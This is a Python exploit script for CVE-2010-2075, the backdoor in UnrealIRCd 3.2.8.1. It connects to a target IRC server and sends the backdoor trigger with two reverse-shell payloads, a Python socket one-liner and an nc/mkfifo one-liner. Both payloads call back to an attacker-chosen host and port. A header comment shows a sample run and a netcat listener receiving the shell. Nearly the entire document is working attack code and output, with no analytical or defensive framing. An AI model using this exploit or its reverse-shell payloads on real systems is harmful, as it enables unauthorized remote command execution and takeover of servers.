#!/usr/bin/python3

#=============================================================================#
#***CVE-2010-2075 exploit***                                                  #
#                                                                             #
#root@i:~# ./irc_3.2.8.1_reverse.py                                           #
#./irc_3.2.8.1_reverse.py <RHOST> <RPORT> <LHOST> <LPORT>                     #
#                                                                             #
#                                                                             #
#root@i:~# ./irc_3.2.8.1_reverse.py 192.168.142.145 6667 192.168.142.154 9999 #
#[*]CONNECTION TO 192.168.142.145:6667                                        #
#[+]SUCCESSFUL CONNECTION                                                     #
#[*]SENDING BACKDOOR COMMAND                                                  #
#root@i:~#                                                                    #
#                                                                             #
#                                                                             #
#root@i:~# nc -lvnp 9999                                                      #
#listening on [any] 9999 ...                                                  #
#connect to [192.168.142.154] from (UNKNOWN) [192.168.142.145] 47635          #
#sh: no job control in this shell                                             #
#sh-3.2                                                                       #
#sh-3.2                                                                       #
#=============================================================================#

import socket
import sys
if len(sys.argv) != 5:
    print("{0} <RHOST> <RPORT> <LHOST> <LPORT>".format(sys.argv[0]))
    sys.exit()
else:
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]

    py_payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
""".format(lhost,int(lport))

    nc_payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f""".format(lhost,int(lport))
                
if __name__ == "__main__":
    print("[*]CONNECTION TO {0}:{1}".format(rhost,rport))
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((rhost,int(rport)))
        print("[+]SUCCESSFUL CONNECTION")
        print("[*]SENDING BACKDOOR COMMAND")
        data = "AB;" + py_payload + "\n"
        s.send(str.encode(data))
        data = "AB;" + nc_payload + "\n"
        s.send(str.encode(data))
        s.close()
    except:
        print("[-]CONNECTION FAILED")
        s.close()
        sys.exit()
